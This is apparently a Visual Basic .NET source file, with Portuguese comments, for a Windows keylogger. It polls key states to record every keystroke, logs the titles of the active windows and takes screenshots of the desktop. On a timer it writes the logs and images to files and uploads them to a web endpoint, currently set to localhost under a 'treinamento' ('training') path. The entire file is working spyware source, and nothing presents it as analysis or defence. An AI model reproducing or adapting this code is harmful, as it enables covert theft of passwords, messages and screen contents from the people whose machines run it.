Imports System.Drawing, System.Drawing.Drawing2D, System.Windows.Forms.Screen, System.Drawing.Graphics
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "User32" (ByVal tecla As Integer) As Short
    Private Declare Function GetForegroundWindow Lib "User32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "User32" (ByVal hWnd As System.IntPtr, ByVal lpStriong As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private tituloold As String
    Private Function pegatitulo() As String
        Dim titulo As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, titulo, titulo.Capacity)
        Return titulo.ToString()
    End Function
    Private Function CapturarTela() As Bitmap
        Try
            Dim Tela As New Bitmap(PrimaryScreen.Bounds.Width, PrimaryScreen.Bounds.Height, Imaging.PixelFormat.Format32bppArgb)
            Dim GFX As Graphics = FromImage(Tela)
            GFX.CopyFromScreen(PrimaryScreen.Bounds.X, PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy)
            Return Tela
            Tela.Dispose()
            GFX.Dispose()
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Function
    
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
        Entregador.Start()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        'TITLE LOGGER
        Dim tituloatual As String = pegatitulo()
        If Not tituloatual = tituloold Then
            If Not tituloatual = "" Then
                tituloold = tituloatual
                TextBox1.Text &= vbNewLine & vbNewLine & "Janela atual: " & tituloatual & vbNewLine
            End If
        End If




        'KEYLOGGER
        For i As Integer = 65 To 90
            If GetAsyncKeyState(i) Then
                If Control.IsKeyLocked(Keys.CapsLock) Then
                    If GetAsyncKeyState(16) Then
                        TextBox1.Text &= Chr(i).ToString.ToLower
                    Else
                        TextBox1.Text &= Chr(i)
                    End If
                Else
                    If GetAsyncKeyState(16) Then
                        TextBox1.Text &= Chr(i)
                    Else
                        TextBox1.Text &= Chr(i).ToString.ToLower
                    End If

                End If
            End If

        Next

        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(49) Then
                TextBox1.Text &= "!"
            End If
        Else

            If GetAsyncKeyState(49) Then
                TextBox1.Text &= "1"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(50) Then
                TextBox1.Text &= "@"
            End If
        Else

            If GetAsyncKeyState(50) Then
                TextBox1.Text &= "2"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(51) Then
                TextBox1.Text &= "#"
            End If
        Else

            If GetAsyncKeyState(51) Then
                TextBox1.Text &= "3"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(52) Then
                TextBox1.Text &= "$"
            End If
        Else

            If GetAsyncKeyState(52) Then
                TextBox1.Text &= "4"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(53) Then
                TextBox1.Text &= "%"
            End If
        Else

            If GetAsyncKeyState(53) Then
                TextBox1.Text &= "5"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(54) Then
                TextBox1.Text &= "¨"
            End If
        Else

            If GetAsyncKeyState(54) Then
                TextBox1.Text &= "6"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(55) Then
                TextBox1.Text &= "&"
            End If
        Else

            If GetAsyncKeyState(55) Then
                TextBox1.Text &= "7"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(56) Then
                TextBox1.Text &= "*"
            End If
        Else

            If GetAsyncKeyState(56) Then
                TextBox1.Text &= "8"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(57) Then
                TextBox1.Text &= "("
            End If
        Else

            If GetAsyncKeyState(57) Then
                TextBox1.Text &= "9"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(48) Then
                TextBox1.Text &= ")"
            End If
        Else

            If GetAsyncKeyState(48) Then
                TextBox1.Text &= "0"
            End If
        End If
        If GetAsyncKeyState(16) Then
            If GetAsyncKeyState(54) Then
                TextBox1.Text &= "¨"
            End If
        Else

            If GetAsyncKeyState(54) Then
                TextBox1.Text &= "6"
            End If
        End If

        If GetAsyncKeyState(32) Then
            TextBox1.Text &= " "
        End If
        If GetAsyncKeyState(8) Then
            TextBox1.Text &= "/APAGOU/"
        End If
        If GetAsyncKeyState(13) Then
            TextBox1.Text &= "/ENTER/"
        End If
        If GetAsyncKeyState(27) Then
            TextBox1.Text &= "/ESC/"
        End If
        If GetAsyncKeyState(17) Then
            TextBox1.Text &= "/CRTL/"
        End If
        If GetAsyncKeyState(18) Then
            TextBox1.Text &= "/ALT/"
        End If
        If GetAsyncKeyState(20) Then
            TextBox1.Text &= "/CAPSLOCK/"
        End If
        If GetAsyncKeyState(112) Then
            TextBox1.Text &= "/F1/"
        End If
        If GetAsyncKeyState(113) Then
            TextBox1.Text &= "/F2/"
        End If
        If GetAsyncKeyState(114) Then
            TextBox1.Text &= "/F3/"
        End If
        If GetAsyncKeyState(115) Then
            TextBox1.Text &= "/F4/"
        End If
        If GetAsyncKeyState(116) Then
            TextBox1.Text &= "/F5/"
        End If
        If GetAsyncKeyState(117) Then
            TextBox1.Text &= "/F6/"
        End If
        If GetAsyncKeyState(118) Then
            TextBox1.Text &= "/F7/"
        End If
        If GetAsyncKeyState(119) Then
            TextBox1.Text &= "/F8/"
        End If
        If GetAsyncKeyState(120) Then
            TextBox1.Text &= "/F9/"
        End If
        If GetAsyncKeyState(121) Then
            TextBox1.Text &= "/F10/"
        End If
        If GetAsyncKeyState(122) Then
            TextBox1.Text &= "/F11/"
        End If
        If GetAsyncKeyState(123) Then
            TextBox1.Text &= "/F12/"
        End If
        If GetAsyncKeyState(96) Then
            TextBox1.Text &= "0"
        End If
        If GetAsyncKeyState(97) Then
            TextBox1.Text &= "1"
        End If
        If GetAsyncKeyState(98) Then
            TextBox1.Text &= "2"
        End If
        If GetAsyncKeyState(99) Then
            TextBox1.Text &= "3"
        End If
        If GetAsyncKeyState(100) Then
            TextBox1.Text &= "4"
        End If
        If GetAsyncKeyState(101) Then
            TextBox1.Text &= "5"
        End If
        If GetAsyncKeyState(102) Then
            TextBox1.Text &= "6"
        End If
        If GetAsyncKeyState(103) Then
            TextBox1.Text &= "7"
        End If
        If GetAsyncKeyState(104) Then
            TextBox1.Text &= "8"
        End If
        If GetAsyncKeyState(105) Then
            TextBox1.Text &= "9"
        End If
        If GetAsyncKeyState(106) Then
            TextBox1.Text &= "*"
        End If
        If GetAsyncKeyState(107) Then
            TextBox1.Text &= "+"
        End If
        If GetAsyncKeyState(109) Then
            TextBox1.Text &= "-"
        End If
        If GetAsyncKeyState(110) Then
            TextBox1.Text &= "."
        End If
        If GetAsyncKeyState(111) Then
            TextBox1.Text &= "/"
        End If
        If GetAsyncKeyState(144) Then
            TextBox1.Text &= "/NUMLOCK/"
        End If
        If GetAsyncKeyState(9) Then
            TextBox1.Text &= "/TAB/"
        End If
        If GetAsyncKeyState(44) Then
            TextBox1.Text &= "/PRINT/"
        End If
        If GetAsyncKeyState(190) Then
            TextBox1.Text &= "."
        End If
        If GetAsyncKeyState(188) Then
            TextBox1.Text &= ","
        End If
        If GetAsyncKeyState(40) Then
            TextBox1.Text &= "/SETABAIXO/"
        End If
        If GetAsyncKeyState(38) Then
            TextBox1.Text &= "/SETACIMA/"
        End If
        If GetAsyncKeyState(39) Then
            TextBox1.Text &= "/SETADIREITA/"
        End If
        If GetAsyncKeyState(37) Then
            TextBox1.Text &= "/SETAESQUERDA/"
        End If
    End Sub

    Private Sub Entregador_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Entregador.Tick
        'ENTREGAR LOGS
        MsgBox("entregador enviou algo para você!!")
        Dim arquivosdelogs As System.IO.FileStream
        arquivosdelogs = System.IO.File.Create(Application.StartupPath & "/logsparaenviar.txt")
        arquivosdelogs.Close()
        My.Computer.FileSystem.WriteAllText(Application.StartupPath & "/logsparaenviar.txt", TextBox1.Text, False)
        My.Computer.Network.UploadFile(Application.StartupPath & "/logsparaenviar.txt", "http://localhost/treinamento/index.php")
        TextBox1.Text = ""
        'ENTREGAR IMAGENS
        PictureBox1.Image = CapturarTela()
        PictureBox1.Image.Save(Application.StartupPath & "/clientedesktop.png", System.Drawing.Imaging.ImageFormat.Png)
        My.Computer.Network.UploadFile(Application.StartupPath & "/clientedesktop.png", "http://localhost/treinamento/index.php")
    End Sub
End Class
